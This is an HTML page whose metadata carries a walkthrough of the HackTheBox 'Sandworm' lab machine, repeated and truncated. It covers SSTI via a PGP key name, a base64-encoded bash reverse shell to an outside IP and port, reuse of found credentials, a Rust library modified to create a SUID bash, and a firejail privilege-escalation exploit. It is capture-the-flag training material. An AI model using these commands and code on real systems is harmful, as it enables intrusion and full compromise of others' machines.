<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="HackTheBox-Sandworm Walkthrough" /><meta property="og:locale" content="en" /><meta name="description" content="Description : Sandworm presents a challenging journey, starting with PGP signatures and SSTI exploration to gain SSH access as ‘silentobserver.’ Uncovered a Rust script running as root, leveraged a firejail vulnerability for privilege escalation, ultimately achieving root access on the Linux machine. Nmap : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 nmap -p 22,80,443 -sCV ssa.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-17 20:19 GMT Nmap scan report for ssa.htb (10.10.11.218) Host is up (0.15s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://ssa.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA | Not valid before: 2023-05-04T18:03:25 |_Not valid after: 2050-09-19T18:03:25 |_http-title: Secret Spy Agency | Secret Security Service Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.80 seconds from nmap we have OpenSSH 8.9p1 on Port 22, nginx 1.18.0 on Ports 80 and 443 with SSL certificate for “SSA,”. The site redirect us to http://ssa.htb/ website 443 : This site seems to be the online presence of the Secret Spy Agency (SSA), specializing in cryptology, foreign signals intelligence (SIGINT), and cybersecurity services to enhance national security efforts. dirsearch : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 dirsearch -u ssa.htb /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /root/reports/_ssa.htb/_23-11-17_19-53-48.txt Target: https://ssa.htb/ [19:53:48] Starting: [19:54:12] 200 - 5KB - /about [19:54:15] 302 - 227B - /admin -&gt; /login?next=%2Fadmin [19:54:56] 200 - 3KB - /contact [19:55:20] 200 - 9KB - /guide [19:55:40] 200 - 4KB - /login [19:55:41] 302 - 229B - /logout -&gt; /login?next=%2Flogout Task Completed checking login page , but it seems nothing to do here The notice indicates that the site is powered by Flask, which means this site is using flask framework. Let’s keep that in mind. The contact page showcases a form for submitting encrypted tips. It seems nothing interesting; let’s move on to the guide page Secret Spy Agency’s site appears to provide interactive exercises for PGP encryption/decryption, emphasizing secure communication practices PGP (Pretty Good Privacy) : Background : Pretty Good Privacy (PGP) is a robust encryption protocol that employs a combination of symmetric-key and public-key cryptography for secure message communication. In the encryption process, a random symmetric key is generated for message content, which is then encrypted using the recipient’s public key. Upon receiving the encrypted message, the recipient uses their private key to decrypt the symmetric key, enabling subsequent decryption of the actual message content. PGP ensures end-to-end security, user authentication, and message integrity, making it a widely adopted solution for secure electronic communication Shell as atlas Identify SSTI (Server Side Template Injection) We are moving to the ‘Verify Signature’ section, generating a PGP public key and PGP signed message. This can be done using a PGP tool that is already available on Debian distribution generate pgp public and private keys: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# gpg --gen-key gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Note: Use &quot;gpg --full-generate-key&quot; for a full featured key generation dialog. GnuPG needs to construct a user ID to identify your key. Real name: emsec Email address: emsec@emsec.com You selected this USER-ID: &quot;emsec &lt;emsec@emsec.com&gt;&quot; Change (N)ame, (E)mail, or (O)kay/(Q)uit? o We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. gpg: revocation certificate stored as &#39;/root/.gnupg/openpgp-revocs.d/C98C59FAEFAD2A327A70709AAD5FD26F46AE1182.rev&#39; public and secret key created and signed. pub rsa3072 2023-11-17 [SC] [expires: 2025-11-16] C98C59FAEFAD2A327A70709AAD5FD26F46AE1182 uid emsec &lt;emsec@emsec.com&gt; sub rsa3072 2023-11-17 [E] [expires: 2025-11-16] Find the pgp public key we just created : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# gpg --verbose --armor --export emsec gpg: writing to stdout -----BEGIN PGP PUBLIC KEY BLOCK----- mQGNBGVX8hoBDADhzt0lyX/MRpz5qiuQwdr6AR9U+KgHIlbZ2dwHyhBASe9dYr1X fvFAt/YBrmFKu7X5KGeh6HIQckLhhJcFZ+J37FDcr521Uhfn1tHcNpv8HmURuXVT G1x824bjnEjh/mNv3yszAGMmsTKoU9Pfh7S/KexdepuRVo5VyPZFjDtToClvGmFA RTdY0OgIiocm+FMMPDNTTNmXICfYXNcjLPwYFfYrEdZZD76UDVvQNjF2yz2N1YsK -----------------------&lt;snippet key&gt;---------------------------- 1KQsPHtXFl5nAaki2LAAAF6FL7jfKJ/PHnMq/rFiCwFlDh+zRCCg2yeKnqt8TpcH 5wMVN/EyMmNleI68AonFepIDWXB28U0p/Pstff2TVkqvOLlCB+svpOxnJLgqfwus u1d6LQ85ObGfKyX+RVWXtNWBuYzpXzw6foFI7l197MQ28aWabFdez1GA3SZ9jTab 9eRUTJbTYMNVmpj0FLZrWemSCowFhV0xFq5jcWz0yG9hnmq9fDor5bAdLBRQ3J05 F3MZanTAkQCjZ3ZyyPc294yBcWitytsE/jMlvslxIPtz4IAQWPQdl33Hk+YVlOIK MDkH5NEqU+1Cv72TiQA/JH/wdBgVCcvJT+i4QeHpXeJGBBrUyOourbxN49ZUdegC x/VT3u7XAwzYvjLtnZuZb+jH4WSqWTxFBDXz9Q5y =I2R6 -----END PGP PUBLIC KEY BLOCK----- Generate pgp signed message : Create a file called ‘test’ containing any text. Next, to create a PGP signed message, we will sign this file ‘test’ with our PGP public key using the command: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# touch test_file ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# echo &quot;This is emsec&quot; &gt; test_file ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# gpg --verbose -u emsec --clear-sign test_file gpg: writing to &#39;test_file.asc&#39; gpg: pinentry launched (137563 gnome3:curses 1.2.1 /dev/pts/3 xterm-256color :0.0 20600/0/5 0/0 -) gpg: RSA/SHA512 signature from: &quot;8FF1A1B62986214E emsec &lt;emsec@emsec.com&gt;&quot; ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# cat test_file.asc -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA512 This is emsec -----BEGIN PGP SIGNATURE----- iQHEBAEBCgAuFiEE5nPSS1qEnKUqTXuNj/GhtimGIU4FAmVX/u8QHGVtc2VjQGVt c2VjLmNvbQAKCRCP8aG2KYYhTqkvDADL+dxWozCGyFv5j0SPR/jZxts8Wzn52cfj 8Khrqsod1xy534K+mWmadv1Un7W70z+DEki6GPuK7bNDGvGPUmuyHzSCGPqUZhl0 0elQDmpc5uDOsVFVfjm+0zk/O34V/YKm6KhSIKNKRkuGgaUI38u/xA0KgHgCs3xW nr1y3PzZ1owdcLFCzeUTpKJKcFgCcSXZSdixC3K7oaiAN2CAF4PBs6RAgMZ0hny5 JNDhUaPEWCIafA7ZFvqE6aKWAesXyUIuMHxGLZ/EcsyleMfuhKsgyQYYusOzbk0H 61NzJjTGDWG4G1cn0eWot51w9gcMPO37ZWyYrMpJXgWpZhG4O76BpytEnLWZaix4 iYJHXWgFtZm0FPJso+ji7hhTa4eyu9Bvhq/r2SVAk4NTvD2INQBipn2CghpYzlu0 /c2fmqmxrUT0W0E86Q/uJXMMn99AZxQSr947Ye/3id0JkRkTnO3z8omdvf9kUIr6 koQWgRor6npAHtqQA/5+LRoubvdY6HM= =OXZm -----END PGP SIGNATURE----- Now let’s go back to /guide and enter the GPG public key and signed text that we just generated. Great! Our signature is valid, but more importantly, we see it reflects our username emsec in the message. This is a good sign because we can manipulate this name to reflect our input. Let’s try SSTI payloads. Find We generate the PGP public key and PGP signed message in the same way as before. By including the ssti codes, we successfully load the payload for SSTI. SSTI diagram from Hacktricks Now we will do the same thing of modifying the username, generating the key, etc., to get RCE and have a rev shell The reason we base64 the reverse shell is that certain characters are not allowed for the username in PGP keys encode the shell to base64 1 echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.173/4444 0&gt;&amp;1&#39;&quot; | base64 The finall payload : atlas –&gt; silentobserver Enumeration : I tried to add my public SSH key to the Atlass user, but I got a Read-only file system error. 1 2 3 4 5 atlas@sandworm:~/.ssh$ ls authorized_keys atlas@sandworm:~/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrvOsMQHqYKD7JfCOM4HExbn1Xd4thzE8owKTZzvRry1aaLSi3EumO9pLySC2h9ItTTWlMl1zGl68lzwRbrxgeVbNzw423T/Hzou+RqjsMzbSdvf&lt;snippet&gt;MH0vXHfDoUe5FZbUwZ+S4rgVhwYOniT6ecBWUouwn5C/gb/N85ym2taZTX+2wQNL723s+fdIBtsW3GK5/0vLSuKPxBEa9xkErNuC46oS/1sGsz0k32ZwG+5magDf8YGxlanefgli+09FdCtu8gHJd+T4cmgNYQZ1dA7emysCvNgVC7TSqcfBEGM= root@emsec&quot; &gt;&gt; authorized_keys &lt;mysCvNgVC7TSqcfBEGM= root@emsec&quot; &gt;&gt; authorized_keys bash: authorized_keys: Read-only file system If we try several commands like whoami and sudo -l, we will see that they are not found, which left me a little confused. If we go to the atlas user directories, we will be able to see that there is a .config directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 atlas@sandworm:~$ ls -la ls -la total 52 drwxr-xr-x 8 atlas atlas 4096 Nov 17 16:06 . drwxr-xr-x 4 nobody nogroup 4096 May 4 2023 .. lrwxrwxrwx 1 nobody nogroup 9 Nov 22 2022 .bash_history -&gt; /dev/null -rw-r--r-- 1 atlas atlas 220 Nov 22 2022 .bash_logout -rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 .bashrc drwxrwxr-x 2 atlas atlas 4096 Jun 6 08:49 .cache drwxrwxr-x 3 atlas atlas 4096 Feb 7 2023 .cargo drwxrwxr-x 4 atlas atlas 4096 Jan 15 2023 .config -rwxrwxrwx 1 atlas atlas 7955 Nov 17 16:06 exploit.py drwx------ 4 atlas atlas 4096 Nov 18 02:00 .gnupg drwxrwxr-x 6 atlas atlas 4096 Feb 6 2023 .local -rw-r--r-- 1 atlas atlas 807 Nov 22 2022 .profile drwx------ 2 atlas atlas 4096 Nov 17 16:12 .ssh atlas@sandworm:~$ cd .config cd .config atlas@sandworm:~/.config$ ls ls firejail httpie /home/atlas/.config has Firejail and HTTPie. Firejail is a sandbox program designed to prevent security breaches by restricting the environment. Going further, in /home/atlas/.config/httpie/sessions/localhost_5000/admin.json, we have the following: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 { &quot;__meta__&quot;: { &quot;about&quot;: &quot;HTTPie session file&quot;, &quot;help&quot;: &quot;https://httpie.io/docs#sessions&quot;, &quot;httpie&quot;: &quot;2.6.0&quot; }, &quot;auth&quot;: { &quot;password&quot;: &quot;quietLiketheWind22&quot;, &quot;type&quot;: null, &quot;username&quot;: &quot;silentobserver&quot; }, &quot;cookies&quot;: { &quot;session&quot;: { &quot;expires&quot;: null, &quot;path&quot;: &quot;/&quot;, &quot;secure&quot;: false, &quot;value&quot;: &quot;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA&quot; } }, &quot;headers&quot;: { &quot;Accept&quot;: &quot;application/json, */*;q=0.5&quot; } } We have SSH credentials for the silentobserver user SSH : silentobserver:quietLiketheWind22 With these creds, I can SSH as silentobserver 1 2 3 4 5 6 7 ┌──(root㉿emsec)-[~] └─# ssh silentobserver@ssa.htb ...[snip]... Last login: Fri Nov 17 15:51:57 2023 from 10.10.14.112 silentobserver@sandworm:~$ whoami silentobserver silentobserver@sandworm:~$ And read user.txt: 1 2 silentobserver@sandworm:~$ cat user.txt 0646b5ff************************ silentobserver –&gt; atlas Searching for SUID binaries, we found one that doesn’t seem common. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 silentobserver@sandworm:~$ find / -perm -u=s -type f 2&gt;/dev/null /opt/tipnet/target/debug/tipnet /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48 /usr/local/bin/firejail /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/libexec/polkit-agent-helper-1 /usr/bin/mount /usr/bin/sudo /usr/bin/gpasswd /usr/bin/umount /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /usr/bin/su /usr/bin/fusermount3 lib.rs By running pspy, we can deduce that the routine launched every two minutes is executed by root but as the user atlas, that it is Rust, and that the folder to target is /opt/crates In the directory /opt/crates/logger/src, we find a single lib.rs file. Through the process of elimination, we can reasonably assume that this is the file compiled by Atlas every two minutes. 1 2 3 4 5 6 7 8 9 silentobserver@sandworm:/tmp$ cd /opt/crates/logger/src silentobserver@sandworm:/opt/crates/logger/src$ ls lib.rs silentobserver@sandworm:/opt/crates/logger/src$ ls -la total 12 drwxrwxr-x 2 atlas silentobserver 4096 May 4 2023 . drwxr-xr-x 5 atlas silentobserver 4096 May 4 2023 .. -rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rs silentobserver@sandworm:/opt/crates/logger/src$ Essentially, the code interacts with a database using upstream to pull and manipulate files. Notably, it uses an external library: extern crate logger. What makes this interesting is that the library is not imported from the internet but from the machine itself. So, it must be located within the project. After a brief search, we find it at the path: /opt/crates/logger/src 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 extern crate chrono; use std::fs::OpenOptions; use std::io::Write; use chrono::prelude::*; pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string(); let log_message = format!(&quot;[{}] - User: {}, Query: {}, Justification: {}\n&quot;, timestamp, user, query, justification); let mut file = match OpenOptions::new().append(true).create(true).open(&quot;/opt/tipnet/access.log&quot;) { Ok(file) =&gt; file, Err(e) =&gt; { println!(&quot;Error opening log file: {}&quot;, e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(&quot;Error writing to log file: {}&quot;, e); } } If we see its permissions, in the group part it tells us that there are read and write permissions for the silentobserver group : 1 2 silentobserver@sandworm:/opt/crates/logger/src$ ls -la lib.rs -rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rs Fortunately, we belong to that group: 1 2 silentobserver@sandworm:/opt/crates/logger/src$ id uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver) The exploitation involves modifying /opt/crates/logger/src/lib.rs to copy /bin/bash to /tmp/bash and add SUID to it, like this: Modifing lib.rs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 extern crate chrono; use std::fs::{self, OpenOptions}; use std::io::Write; use std::process::Command; use chrono::prelude::*; pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string(); let log_message = format!( &quot;[{}] - User: {}, Query: {}, Justification: {}\n&quot;, timestamp, user, query, justification ); let mut file = match OpenOptions::new() .append(true) .create(true) .open(&quot;/opt/tipnet/access.log&quot;) { Ok(file) =&gt; file, Err(e) =&gt; { println!(&quot;Error opening log file: {}&quot;, e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(&quot;Error writing to log file: {}&quot;, e); } // Copy /bin/bash to /tmp/bash if let Err(e) = fs::copy(&quot;/bin/bash&quot;, &quot;/tmp/bash&quot;) { println!(&quot;Error copying file: {}&quot;, e); return; } // Set SUID permission on /tmp/bash if let Err(e) = Command::new(&quot;chmod&quot;) .args(&amp;[&quot;+s&quot;, &quot;/tmp/bash&quot;]) .output() { println!(&quot;Error setting SUID permission: {}&quot;, e); return; } } Then run /tmp/bash -p after a few minutes to gain control of atlas 1 2 3 4 5 silentobserver@sandworm:/opt/crates/logger/src$ /tmp/bash -p shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory bash-5.1$ whoami atlas bash-5.1$ By adding our public SSH key to the ‘atlas’ user, we can easily connect using SSH. 1 2 3 4 5 6 ┌──(root㉿emsec)-[~/.ssh] └─# ssh -i id_rsa atlas@ssa.htb Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64) ...[snip]... Last login: Sat Nov 18 11:21:21 2023 from 10.10.14.43 atlas@sandworm:~$ Privilege escalation : atlas -&gt; root Enumeration Upon checking the user and group ID, it is revealed that the atlas user belongs to a group called ‘jailer’. 1 2 3 atlas@sandworm:~$ id uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer) If we search for SUID biaries we can see one from firejail: 1 2 3 atlas@sandworm:~$ find / -group jailer -ls 2&gt;/dev/null 1344 1740 -rwsr-x--- 1 root jailer 1777952 Nov 29 2022 /usr/local/bin/firejail atlas@sandworm:~$ SUID firejail privilege escalation Here, the next step involves searching Google for firejail exploits that enable privilege escalation. I came across this one: So, acquire the exploit.py, grant it execute permissions, and execute it. Once run, background the process, then execute ‘firejail –join=27179’ and ‘su -‘ to obtain root access. 1 2 3 4 5 6 7 8 9 10 11 12 13 atlas@sandworm:/tmp$ chmod +x exploit.py atlas@sandworm:/tmp$ ./exploit.py You can now run &#39;firejail --join=27179&#39; in another terminal to obtain a shell where &#39;sudo su -&#39; should grant you a root shell. ^Z [1]+ Stopped ./exploit.py atlas@sandworm:/tmp$ firejail --join=27179 changing root to /proc/27179/root Warning: cleaning all supplementary groups Child process initialized in 10.03 ms atlas@sandworm:/tmp$ su - root@sandworm:~# cat /root/root.txt 12d54f557************************* root@sandworm:~# Happy Hacking ! 👾​❤️​ References : What is PGP Encryption and How Does It Work? Making and verifying signatures SSTI (Server Side Template Injection) PayloadsAllTheThings/Server Side Template Injection/ SUID Firejail" /><meta property="og:description" content="Description : Sandworm presents a challenging journey, starting with PGP signatures and SSTI exploration to gain SSH access as ‘silentobserver.’ Uncovered a Rust script running as root, leveraged a firejail vulnerability for privilege escalation, ultimately achieving root access on the Linux machine. Nmap : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 nmap -p 22,80,443 -sCV ssa.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-17 20:19 GMT Nmap scan report for ssa.htb (10.10.11.218) Host is up (0.15s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://ssa.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA | Not valid before: 2023-05-04T18:03:25 |_Not valid after: 2050-09-19T18:03:25 |_http-title: Secret Spy Agency | Secret Security Service Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.80 seconds from nmap we have OpenSSH 8.9p1 on Port 22, nginx 1.18.0 on Ports 80 and 443 with SSL certificate for “SSA,”. The site redirect us to http://ssa.htb/ website 443 : This site seems to be the online presence of the Secret Spy Agency (SSA), specializing in cryptology, foreign signals intelligence (SIGINT), and cybersecurity services to enhance national security efforts. dirsearch : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 dirsearch -u ssa.htb /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /root/reports/_ssa.htb/_23-11-17_19-53-48.txt Target: https://ssa.htb/ [19:53:48] Starting: [19:54:12] 200 - 5KB - /about [19:54:15] 302 - 227B - /admin -&gt; /login?next=%2Fadmin [19:54:56] 200 - 3KB - /contact [19:55:20] 200 - 9KB - /guide [19:55:40] 200 - 4KB - /login [19:55:41] 302 - 229B - /logout -&gt; /login?next=%2Flogout Task Completed checking login page , but it seems nothing to do here The notice indicates that the site is powered by Flask, which means this site is using flask framework. Let’s keep that in mind. The contact page showcases a form for submitting encrypted tips. It seems nothing interesting; let’s move on to the guide page Secret Spy Agency’s site appears to provide interactive exercises for PGP encryption/decryption, emphasizing secure communication practices PGP (Pretty Good Privacy) : Background : Pretty Good Privacy (PGP) is a robust encryption protocol that employs a combination of symmetric-key and public-key cryptography for secure message communication. In the encryption process, a random symmetric key is generated for message content, which is then encrypted using the recipient’s public key. Upon receiving the encrypted message, the recipient uses their private key to decrypt the symmetric key, enabling subsequent decryption of the actual message content. PGP ensures end-to-end security, user authentication, and message integrity, making it a widely adopted solution for secure electronic communication Shell as atlas Identify SSTI (Server Side Template Injection) We are moving to the ‘Verify Signature’ section, generating a PGP public key and PGP signed message. This can be done using a PGP tool that is already available on Debian distribution generate pgp public and private keys: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# gpg --gen-key gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Note: Use &quot;gpg --full-generate-key&quot; for a full featured key generation dialog. GnuPG needs to construct a user ID to identify your key. Real name: emsec Email address: emsec@emsec.com You selected this USER-ID: &quot;emsec &lt;emsec@emsec.com&gt;&quot; Change (N)ame, (E)mail, or (O)kay/(Q)uit? o We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. gpg: revocation certificate stored as &#39;/root/.gnupg/openpgp-revocs.d/C98C59FAEFAD2A327A70709AAD5FD26F46AE1182.rev&#39; public and secret key created and signed. pub rsa3072 2023-11-17 [SC] [expires: 2025-11-16] C98C59FAEFAD2A327A70709AAD5FD26F46AE1182 uid emsec &lt;emsec@emsec.com&gt; sub rsa3072 2023-11-17 [E] [expires: 2025-11-16] Find the pgp public key we just created : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# gpg --verbose --armor --export emsec gpg: writing to stdout -----BEGIN PGP PUBLIC KEY BLOCK----- mQGNBGVX8hoBDADhzt0lyX/MRpz5qiuQwdr6AR9U+KgHIlbZ2dwHyhBASe9dYr1X fvFAt/YBrmFKu7X5KGeh6HIQckLhhJcFZ+J37FDcr521Uhfn1tHcNpv8HmURuXVT G1x824bjnEjh/mNv3yszAGMmsTKoU9Pfh7S/KexdepuRVo5VyPZFjDtToClvGmFA RTdY0OgIiocm+FMMPDNTTNmXICfYXNcjLPwYFfYrEdZZD76UDVvQNjF2yz2N1YsK -----------------------&lt;snippet key&gt;---------------------------- 1KQsPHtXFl5nAaki2LAAAF6FL7jfKJ/PHnMq/rFiCwFlDh+zRCCg2yeKnqt8TpcH 5wMVN/EyMmNleI68AonFepIDWXB28U0p/Pstff2TVkqvOLlCB+svpOxnJLgqfwus u1d6LQ85ObGfKyX+RVWXtNWBuYzpXzw6foFI7l197MQ28aWabFdez1GA3SZ9jTab 9eRUTJbTYMNVmpj0FLZrWemSCowFhV0xFq5jcWz0yG9hnmq9fDor5bAdLBRQ3J05 F3MZanTAkQCjZ3ZyyPc294yBcWitytsE/jMlvslxIPtz4IAQWPQdl33Hk+YVlOIK MDkH5NEqU+1Cv72TiQA/JH/wdBgVCcvJT+i4QeHpXeJGBBrUyOourbxN49ZUdegC x/VT3u7XAwzYvjLtnZuZb+jH4WSqWTxFBDXz9Q5y =I2R6 -----END PGP PUBLIC KEY BLOCK----- Generate pgp signed message : Create a file called ‘test’ containing any text. Next, to create a PGP signed message, we will sign this file ‘test’ with our PGP public key using the command: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# touch test_file ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# echo &quot;This is emsec&quot; &gt; test_file ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# gpg --verbose -u emsec --clear-sign test_file gpg: writing to &#39;test_file.asc&#39; gpg: pinentry launched (137563 gnome3:curses 1.2.1 /dev/pts/3 xterm-256color :0.0 20600/0/5 0/0 -) gpg: RSA/SHA512 signature from: &quot;8FF1A1B62986214E emsec &lt;emsec@emsec.com&gt;&quot; ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# cat test_file.asc -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA512 This is emsec -----BEGIN PGP SIGNATURE----- iQHEBAEBCgAuFiEE5nPSS1qEnKUqTXuNj/GhtimGIU4FAmVX/u8QHGVtc2VjQGVt c2VjLmNvbQAKCRCP8aG2KYYhTqkvDADL+dxWozCGyFv5j0SPR/jZxts8Wzn52cfj 8Khrqsod1xy534K+mWmadv1Un7W70z+DEki6GPuK7bNDGvGPUmuyHzSCGPqUZhl0 0elQDmpc5uDOsVFVfjm+0zk/O34V/YKm6KhSIKNKRkuGgaUI38u/xA0KgHgCs3xW nr1y3PzZ1owdcLFCzeUTpKJKcFgCcSXZSdixC3K7oaiAN2CAF4PBs6RAgMZ0hny5 JNDhUaPEWCIafA7ZFvqE6aKWAesXyUIuMHxGLZ/EcsyleMfuhKsgyQYYusOzbk0H 61NzJjTGDWG4G1cn0eWot51w9gcMPO37ZWyYrMpJXgWpZhG4O76BpytEnLWZaix4 iYJHXWgFtZm0FPJso+ji7hhTa4eyu9Bvhq/r2SVAk4NTvD2INQBipn2CghpYzlu0 /c2fmqmxrUT0W0E86Q/uJXMMn99AZxQSr947Ye/3id0JkRkTnO3z8omdvf9kUIr6 koQWgRor6npAHtqQA/5+LRoubvdY6HM= =OXZm -----END PGP SIGNATURE----- Now let’s go back to /guide and enter the GPG public key and signed text that we just generated. Great! Our signature is valid, but more importantly, we see it reflects our username emsec in the message. This is a good sign because we can manipulate this name to reflect our input. Let’s try SSTI payloads. Find We generate the PGP public key and PGP signed message in the same way as before. By including the ssti codes, we successfully load the payload for SSTI. SSTI diagram from Hacktricks Now we will do the same thing of modifying the username, generating the key, etc., to get RCE and have a rev shell The reason we base64 the reverse shell is that certain characters are not allowed for the username in PGP keys encode the shell to base64 1 echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.173/4444 0&gt;&amp;1&#39;&quot; | base64 The finall payload : atlas –&gt; silentobserver Enumeration : I tried to add my public SSH key to the Atlass user, but I got a Read-only file system error. 1 2 3 4 5 